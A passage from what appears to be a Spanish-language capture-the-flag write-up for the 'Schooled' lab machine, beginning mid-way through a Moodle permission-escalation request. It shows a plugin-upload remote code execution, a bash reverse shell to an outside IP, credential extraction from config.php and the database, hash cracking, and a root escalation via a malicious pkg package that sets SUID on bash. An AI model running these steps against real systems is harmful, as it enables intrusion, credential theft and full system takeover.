1&moodle%2Frestore%3Arestoreactivity=1&moodle%2Frestore%3Arestorecourse=1&moodle%2Frestore%3Arestoresection=1&moodle%2Frestore%3Arestoretargetimport=1&moodle%2Frestore%3Arolldates=1&moodle%2Frestore%3Auploadfile=1&moodle%2Frestore%3Auserinfo=1&moodle%2Frestore%3Aviewautomatedfilearea=1&moodle%2Frole%3Aassign=1&moodle%2Frole%3Aoverride=1&moodle%2Frole%3Areview=1&moodle%2Frole%3Asafeoverride=1&moodle%2Frole%3Aswitchroles=1&moodle%2Fsite%3Aviewreports=1&moodle%2Fuser%3Aloginas=1&moodle%2Fuser%3Aviewdetails=1&moodle%2Fuser%3Aviewhiddendetails=1&report%2Fcompletion%3Aview=1&report%2Flog%3Aview=1&report%2Flog%3Aviewtoday=1&report%2Floglive%3Aview=1&report%2Foutline%3Aview=1&report%2Foutline%3Aviewuserreport=1&report%2Fparticipation%3Aview=1&report%2Fprogress%3Aview=1&report%2Fstats%3Aview=1&repository%2Fcontentbank%3Aaccesscoursecontent=1&tool%2Fmonitor%3Amanagerules=1&tool%2Fmonitor%3Asubscribe=1&tool%2Frecyclebin%3Adeleteitems=1&tool%2Frecyclebin%3Arestoreitems=1&tool%2Frecyclebin%3Aviewitems=1&webservice%2Frest%3Ause=1&webservice%2Fsoap%3Ause=1&webservice%2Fxmlrpc%3Ause=1&atto%2Fh5p%3Aaddembed=1&atto%2Frecordrtc%3Arecordaudio=1&atto%2Frecordrtc%3Arecordvideo=1&booktool%2Fexportimscp%3Aexport=1&booktool%2Fimporthtml%3Aimport=1&booktool%2Fprint%3Aprint=1&forumreport%2Fsummary%3Aview=1&forumreport%2Fsummary%3Aviewall=1&mod%2Fassign%3Aeditothersubmission=1&mod%2Fassign%3Aexportownsubmission=1&mod%2Fassign%3Agrade=1&mod%2Fassign%3Agrantextension=1&mod%2Fassign%3Amanageallocations=1&mod%2Fassign%3Amanagegrades=1&mod%2Fassign%3Amanageoverrides=1&mod%2Fassign%3Areceivegradernotifications=1&mod%2Fassign%3Areleasegrades=1&mod%2Fassign%3Arevealidentities=1&mod%2Fassign%3Areviewgrades=1&mod%2Fassign%3Ashowhiddengrader=1&mod%2Fassign%3Asubmit=1&mod%2Fassign%3Aview=1&mod%2Fassign%3Aviewblinddetails=1&mod%2Fassign%3Aviewgrades=1&mod%2Fassignment%3Aexportownsubmission=1&mod%2Fassignment%3Agrade=1&mod%2Fassignment%3Asubmit=1&mod%2Fassignment%3Aview=1&mod%2Fbook%3Aedit=1&mod%2Fbook%3Aread=1&mod%2Fbook%3Aviewhiddenchapters=1&mod%2Fchat%3Achat=1&mod%2Fchat%3Adeletelog=1&mod%2Fchat%3Aexportparticipatedsession=1&mod%2Fchat%3Aexportsession=1&mod%2Fchat%3Areadlog=1&mod%2Fchat%3Aview=1&mod%2Fchoice%3Achoose=1&mod%2Fchoice%3Adeleteresponses=1&mod%2Fchoice%3Adownloadresponses=1&mod%2Fchoice%3Areadresponses=1&mod%2Fchoice%3Aview=1&mod%2Fdata%3Aapprove=1&mod%2Fdata%3Acomment=1&mod%2Fdata%3Aexportallentries=1&mod%2Fdata%3Aexportentry=1&mod%2Fdata%3Aexportownentry=1&mod%2Fdata%3Aexportuserinfo=1&mod%2Fdata%3Amanagecomments=1&mod%2Fdata%3Amanageentries=1&mod%2Fdata%3Amanagetemplates=1&mod%2Fdata%3Amanageuserpresets=1&mod%2Fdata%3Arate=1&mod%2Fdata%3Aview=1&mod%2Fdata%3Aviewallratings=1&mod%2Fdata%3Aviewalluserpresets=1&mod%2Fdata%3Aviewanyrating=1&mod%2Fdata%3Aviewentry=1&mod%2Fdata%3Aviewrating=1&mod%2Fdata%3Awriteentry=1&mod%2Ffeedback%3Acomplete=1&mod%2Ffeedback%3Acreateprivatetemplate=1&mod%2Ffeedback%3Acreatepublictemplate=1&mod%2Ffeedback%3Adeletesubmissions=1&mod%2Ffeedback%3Adeletetemplate=1&mod%2Ffeedback%3Aedititems=1&mod%2Ffeedback%3Amapcourse=1&mod%2Ffeedback%3Areceivemail=1&mod%2Ffeedback%3Aview=1&mod%2Ffeedback%3Aviewanalysepage=1&mod%2Ffeedback%3Aviewreports=1&mod%2Ffolder%3Amanagefiles=1&mod%2Ffolder%3Aview=1&mod%2Fforum%3Aaddnews=1&mod%2Fforum%3Aaddquestion=1&mod%2Fforum%3Aallowforcesubscribe=1&mod%2Fforum%3Acanoverridecutoff=1&mod%2Fforum%3Acanoverridediscussionlock=1&mod%2Fforum%3Acanposttomygroups=1&mod%2Fforum%3Acantogglefavourite=1&mod%2Fforum%3Acreateattachment=1&mod%2Fforum%3Adeleteanypost=1&mod%2Fforum%3Adeleteownpost=1&mod%2Fforum%3Aeditanypost=1&mod%2Fforum%3Aexportdiscussion=1&mod%2Fforum%3Aexportforum=1&mod%2Fforum%3Aexportownpost=1&mod%2Fforum%3Aexportpost=1&mod%2Fforum%3Agrade=1&mod%2Fforum%3Amanagesubscriptions=1&mod%2Fforum%3Amovediscussions=1&mod%2Fforum%3Apindiscussions=1&mod%2Fforum%3Apostprivatereply=1&mod%2Fforum%3Apostwithoutthrottling=1&mod%2Fforum%3Arate=1&mod%2Fforum%3Areadprivatereplies=1&mod%2Fforum%3Areplynews=1&mod%2Fforum%3Areplypost=1&mod%2Fforum%3Asplitdiscussions=1&mod%2Fforum%3Astartdiscussion=1&mod%2Fforum%3Aviewallratings=1&mod%2Fforum%3Aviewanyrating=1&mod%2Fforum%3Aviewdiscussion=1&mod%2Fforum%3Aviewhiddentimedposts=1&mod%2Fforum%3Aviewqandawithoutposting=1&mod%2Fforum%3Aviewrating=1&mod%2Fforum%3Aviewsubscribers=1&mod%2Fglossary%3Aapprove=1&mod%2Fglossary%3Acomment=1&mod%2Fglossary%3Aexport=1&mod%2Fglossary%3Aexportentry=1&mod%2Fglossary%3Aexportownentry=1&mod%2Fglossary%3Aimport=1&mod%2Fglossary%3Amanagecategories=1&mod%2Fglossary%3Amanagecomments=1&mod%2Fglossary%3Amanageentries=1&mod%2Fglossary%3Arate=1&mod%2Fglossary%3Aview=1&mod%2Fglossary%3Aviewallratings=1&mod%2Fglossary%3Aviewanyrating=1&mod%2Fglossary%3Aviewrating=1&mod%2Fglossary%3Awrite=1&mod%2Fh5pactivity%3Areviewattempts=1&mod%2Fh5pactivity%3Asubmit=1&mod%2Fh5pactivity%3Aview=1&mod%2Fimscp%3Aview=1&mod%2Flabel%3Aview=1&mod%2Flesson%3Aedit=1&mod%2Flesson%3Agrade=1&mod%2Flesson%3Amanage=1&mod%2Flesson%3Amanageoverrides=1&mod%2Flesson%3Aview=1&mod%2Flesson%3Aviewreports=1&mod%2Flti%3Aadmin=1&mod%2Flti%3Amanage=1&mod%2Flti%3Aview=1&mod%2Fpage%3Aview=1&mod%2Fquiz%3Aattempt=1&mod%2Fquiz%3Adeleteattempts=1&mod%2Fquiz%3Aemailconfirmsubmission=1&mod%2Fquiz%3Aemailnotifysubmission=1&mod%2Fquiz%3Aemailwarnoverdue=1&mod%2Fquiz%3Agrade=1&mod%2Fquiz%3Aignoretimelimits=1&mod%2Fquiz%3Amanage=1&mod%2Fquiz%3Amanageoverrides=1&mod%2Fquiz%3Apreview=1&mod%2Fquiz%3Aregrade=1&mod%2Fquiz%3Areviewmyattempts=1&mod%2Fquiz%3Aview=1&mod%2Fquiz%3Aviewreports=1&mod%2Fresource%3Aview=1&mod%2Fscorm%3Adeleteownresponses=1&mod%2Fscorm%3Adeleteresponses=1&mod%2Fscorm%3Asavetrack=1&mod%2Fscorm%3Askipview=1&mod%2Fscorm%3Aviewreport=1&mod%2Fscorm%3Aviewscores=1&mod%2Fsurvey%3Adownload=1&mod%2Fsurvey%3Aparticipate=1&mod%2Fsurvey%3Areadresponses=1&mod%2Furl%3Aview=1&mod%2Fwiki%3Acreatepage=1&mod%2Fwiki%3Aeditcomment=1&mod%2Fwiki%3Aeditpage=1&mod%2Fwiki%3Amanagecomment=1&mod%2Fwiki%3Amanagefiles=1&mod%2Fwiki%3Amanagewiki=1&mod%2Fwiki%3Aoverridelock=1&mod%2Fwiki%3Aviewcomment=1&mod%2Fwiki%3Aviewpage=1&mod%2Fworkshop%3Aallocate=1&mod%2Fworkshop%3Adeletesubmissions=1&mod%2Fworkshop%3Aeditdimensions=1&mod%2Fworkshop%3Aexportsubmissions=1&mod%2Fworkshop%3Aignoredeadlines=1&mod%2Fworkshop%3Amanageexamples=1&mod%2Fworkshop%3Aoverridegrades=1&mod%2Fworkshop%3Apeerassess=1&mod%2Fworkshop%3Apublishsubmissions=1&mod%2Fworkshop%3Asubmit=1&mod%2Fworkshop%3Aswitchphase=1&mod%2Fworkshop%3Aview=1&mod%2Fworkshop%3Aviewallassessments=1&mod%2Fworkshop%3Aviewallsubmissions=1&mod%2Fworkshop%3Aviewauthornames=1&mod%2Fworkshop%3Aviewauthorpublished=1&mod%2Fworkshop%3Aviewpublishedsubmissions=1&mod%2Fworkshop%3Aviewreviewernames=1&moodle%2Fbackup%3Abackupactivity=1&moodle%2Fcompetency%3Acoursecompetencyconfigure=1&moodle%2Fcourse%3Aactivityvisibility=1&moodle%2Fcourse%3Aignoreavailabilityrestrictions=1&moodle%2Fcourse%3Amanageactivities=1&moodle%2Fcourse%3Atogglecompletion=1&moodle%2Fcourse%3Aviewhiddenactivities=1&moodle%2Fh5p%3Adeploy=1&moodle%2Fh5p%3Asetdisplayoptions=1&moodle%2Fh5p%3Aupdatelibraries=1&moodle%2Fsite%3Aaccessallgroups=1&moodle%2Fsite%3Amanagecontextlocks=1&moodle%2Fsite%3Atrustcontent=1&moodle%2Fsite%3Aviewanonymousevents=1&moodle%2Fsite%3Aviewfullnames=1&moodle%2Fsite%3Aviewuseridentity=1&quiz%2Fgrading%3Aviewidnumber=1&quiz%2Fgrading%3Aviewstudentnames=1&quiz%2Fstatistics%3Aview=1&quizaccess%2Fseb%3Abypassseb=1&quizaccess%2Fseb%3Amanage_filemanager_sebconfigfile=1&quizaccess%2Fseb%3Amanage_seb_activateurlfiltering=1&quizaccess%2Fseb%3Amanage_seb_allowedbrowserexamkeys=1&quizaccess%2Fseb%3Amanage_seb_allowreloadinexam=1&quizaccess%2Fseb%3Amanage_seb_allowspellchecking=1&quizaccess%2Fseb%3Amanage_seb_allowuserquitseb=1&quizaccess%2Fseb%3Amanage_seb_enableaudiocontrol=1&quizaccess%2Fseb%3Amanage_seb_expressionsallowed=1&quizaccess%2Fseb%3Amanage_seb_expressionsblocked=1&quizaccess%2Fseb%3Amanage_seb_filterembeddedcontent=1&quizaccess%2Fseb%3Amanage_seb_linkquitseb=1&quizaccess%2Fseb%3Amanage_seb_muteonstartup=1&quizaccess%2Fseb%3Amanage_seb_quitpassword=1&quizaccess%2Fseb%3Amanage_seb_regexallowed=1&quizaccess%2Fseb%3Amanage_seb_regexblocked=1&quizaccess%2Fseb%3Amanage_seb_requiresafeexambrowser=1&quizaccess%2Fseb%3Amanage_seb_showkeyboardlayout=1&quizaccess%2Fseb%3Amanage_seb_showreloadbutton=1&quizaccess%2Fseb%3Amanage_seb_showsebdownloadlink=1&quizaccess%2Fseb%3Amanage_seb_showsebtaskbar=1&quizaccess%2Fseb%3Amanage_seb_showtime=1&quizaccess%2Fseb%3Amanage_seb_showwificontrol=1&quizaccess%2Fseb%3Amanage_seb_templateid=1&quizaccess%2Fseb%3Amanage_seb_userconfirmquit=1&repository%2Fareafiles%3Aview=1&repository%2Fboxnet%3Aview=1&repository%2Fcontentbank%3Aview=1&repository%2Fcoursefiles%3Aview=1&repository%2Fdropbox%3Aview=1&repository%2Fequella%3Aview=1&repository%2Ffilesystem%3Aview=1&repository%2Fflickr%3Aview=1&repository%2Fflickr_public%3Aview=1&repository%2Fgoogledocs%3Aview=1&repository%2Flocal%3Aview=1&repository%2Fmerlot%3Aview=0&repository%2Fnextcloud%3Aview=1&repository%2Fonedrive%3Aview=1&repository%2Fpicasa%3Aview=1&repository%2Frecent%3Aview=1&repository%2Fs3%3Aview=1&repository%2Fskydrive%3Aview=1&repository%2Fupload%3Aview=1&repository%2Furl%3Aview=1&repository%2Fuser%3Aview=1&repository%2Fwebdav%3Aview=1&repository%2Fwikimedia%3Aview=1&repository%2Fyoutube%3Aview=1&block%2Factivity_modules%3Aaddinstance=1&block%2Factivity_results%3Aaddinstance=1&block%2Fadmin_bookmarks%3Aaddinstance=1&block%2Fbadges%3Aaddinstance=1&block%2Fblog_menu%3Aaddinstance=1&block%2Fblog_recent%3Aaddinstance=1&block%2Fblog_tags%3Aaddinstance=1&block%2Fcalendar_month%3Aaddinstance=1&block%2Fcalendar_upcoming%3Aaddinstance=1&block%2Fcomments%3Aaddinstance=1&block%2Fcompletionstatus%3Aaddinstance=1&block%2Fcourse_list%3Aaddinstance=1&block%2Fcourse_summary%3Aaddinstance=1&block%2Ffeedback%3Aaddinstance=1&block%2Fglobalsearch%3Aaddinstance=1&block%2Fglossary_random%3Aaddinstance=1&block%2Fhtml%3Aaddinstance=1&block%2Flogin%3Aaddinstance=1&block%2Fmentees%3Aaddinstance=1&block%2Fmnet_hosts%3Aaddinstance=1&block%2Fmyprofile%3Aaddinstance=1&block%2Fnavigation%3Aaddinstance=1&block%2Fnews_items%3Aaddinstance=1&block%2Fonline_users%3Aaddinstance=1&block%2Fonline_users%3Aviewlist=1&block%2Fprivate_files%3Aaddinstance=1&block%2Fquiz_results%3Aaddinstance=1&block%2Frecent_activity%3Aaddinstance=1&block%2Frss_client%3Aaddinstance=1&block%2Frss_client%3Amanageanyfeeds=1&block%2Frss_client%3Amanageownfeeds=1&block%2Fsearch_forums%3Aaddinstance=1&block%2Fsection_links%3Aaddinstance=1&block%2Fselfcompletion%3Aaddinstance=1&block%2Fsettings%3Aaddinstance=1&block%2Fsite_main_menu%3Aaddinstance=1&block%2Fsocial_activities%3Aaddinstance=1&block%2Ftag_flickr%3Aaddinstance=1&block%2Ftag_youtube%3Aaddinstance=1&block%2Ftags%3Aaddinstance=1&moodle%2Fblock%3Aedit=1&moodle%2Fblock%3Aview=1&moodle%2Fsite%3Amanageblocks=1&savechanges=Save+changes
```

![Untitled](/assets/img/Schooled/Pasted image 20240330152518.png)

Actualizando y dirigiéndonos a la sección de Plugins

![Untitled](/assets/img/Schooled/Pasted image 20240318184830.png)

Observamos que la seccion de instalar plugins a sido activada

Subiendo el archivo `rce.zip` disponible en, [GitHub - HoangKien1020/Moodle_RCE](https://github.com/HoangKien1020/Moodle_RCE)

![Untitled](/assets/img/Schooled/Pasted image 20240318185753.png)

Para ejecutar comandos debemos dirigirnos a la ruta `domain/blocks/rce/lang/en/block_rce.php?cmd=id`

```bash
http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id
```

![Untitled](/assets/img/Schooled/Pasted image 20240318185958.png)

Disponemos de `RCE`

## Shell as www

Enviando una reverse shell a nuestra máquina atacante

```bash
bash -c "bash -i >%26 /dev/tcp/10.10.14.11/443 0>%261"
```

![Untitled](/assets/img/Schooled/Pasted image 20240318190937.png)

Obteniendo:

![Untitled](/assets/img/Schooled/Pasted image 20240318191013.png)

## Shell as jamie

En la ruta `/usr/local/www/apache24/data/moodle` encontramos un archivo `config.php` que contiene credenciales para la base de datos

![Untitled](/assets/img/Schooled/Pasted image 20240318192308.png)

```bash
moodle:PlaybookMaster2020
```

Conectandonos a la DB y enumerandola

```bash
> mysql -umoodle -pPlaybookMaster2020 -e 'show databases'
> mysql -umoodle -pPlaybookMaster2020 -e 'describe mdl_user' moodle 2>/dev/null
> mysql -umoodle -pPlaybookMaster2020 -e 'select username,password,email from mdl_user' moodle 2>/dev/null
```

Obteniendo:
![Untitled](/assets/img/Schooled/Pasted image 20240318192752.png)

```bash
guest	$2y$10$u8DkSWjhZnQhBk1a0g1ug.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2	root@localhost
admin	$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW	jamie@staff.schooled.htb
```

Filtrando

![Untitled](/assets/img/Schooled/Pasted image 20240318193921.png)

![Untitled](/assets/img/Schooled/Pasted image 20240318194024.png)

Ataque de fuerza bruta

![Untitled](/assets/img/Schooled/Pasted image 20240318195603.png)

Obteniendo el password:

```bash
!QAZ2wsx
```

Probando password:

![Untitled](/assets/img/Schooled/Pasted image 20240318195801.png)

## Shell as root

Enumerando se tiene que el usuario `jamie` puede ejecutar los siguientes comandos sin proporcionar contraseña:

![Untitled](/assets/img/Schooled/Pasted image 20240330154116.png)

Se tiene que a través del comando `pkg` se puede hacer [pkg | GTFOBins](https://gtfobins.github.io/gtfobins/pkg/#sudo)

Se va a asignar un permiso `SUID` a la `bash`

En la máquina atacante utilizar los siguientes comandos:

```bash
❯ TF=$(mktemp -d)
❯ echo 'chmod u+s /bin/bash' > $TF/x.sh
❯ fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
Created package {:path=>"x-1.0.txz"}
```

se habrá creado un archivo `x-1.0.txz` el cual deberemos transferir a la máquina víctima y ejecutarlo

![Untitled](/assets/img/Schooled/Pasted image 20240318200836.png)

Transfiriendo el archivo a la máquina víctima:

![Untitled](/assets/img/Schooled/Pasted image 20240318201052.png)

Haciendo:

```bash
sudo pkg install -y --no-repo-update ./x-1.0.txz
```

![Untitled](/assets/img/Schooled/Pasted image 20240318202011.png)

Los permisos de la consola `bash` han sido cambiados a `SUID` por lo cual nos podemos ejecutar una consola como el usuario `root` a través de:

```bash
bash -p
```

Obteniendo:

![Untitled](/assets/img/Schooled/Pasted image 20240330155003.png)
